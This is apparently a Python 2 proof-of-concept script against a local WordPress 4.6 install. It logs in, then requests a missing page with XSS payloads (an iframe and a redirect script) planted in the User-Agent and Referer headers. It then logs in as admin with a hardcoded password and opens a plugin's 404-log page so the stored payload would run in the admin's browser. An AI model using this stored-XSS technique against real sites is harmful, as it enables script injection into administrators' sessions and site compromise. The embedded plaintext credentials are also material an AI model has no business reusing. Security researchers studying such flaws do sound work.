#!/usr/bin/python
# coding: utf-8

import mechanize
from bs4 import BeautifulSoup
import urllib2


#Creating a mechanize browser
browser = mechanize.Browser()
browser.set_handle_robots(False)

#Opening my URI to the Wordpress web page 
browser.open("http://localhost:8888/WordPress-4.6/wp-admin/")

#Printing to browser title to show where I am
print "\n" + ("# " + browser.title() + "\n")

#Picking the form of the login
browser.select_form("loginform")

#Below I am filling out the form fields and submitting for log in
browser.form['log'] = 'marc98'
browser.form['pwd'] = 'marco'
browser.submit()

print ("# " + browser.title() + "\n")

header = {'User-Agent': '"<iframe src=/></iframe>', 'Referer': '"<script>var a = /http:/ ; var b = /www.ansa.it/ ;window.location.replace((a+b).substr(1,18));</script>'}
url = "http://localhost:8888/WordPress-4.6/fakepage"

# wrap the request. You can replace None with the needed data if it's a POST request
request = urllib2.Request(url, None, header)

#

print header

# here you go
response = browser.open(request)

print ("# " + browser.title() + "\n")


##There is only one form on this page so I jump right in
browser.select_form("loginform")

##Below I am filling out the form fields and submitting for log in
browser.form['log'] = 'admin'
browser.form['pwd'] = 'hgxSk#Fmexnu0^v!#B'
browser.submit()

#Again printing the browser title to show where I am
print ("# " + browser.title() + "\n")

browser.open("http://localhost:8888/WordPress-4.6/wp-admin/admin.php?page=i4t3-logs")

print ("# " + browser.title() + "\n")

#print browser.response().read()

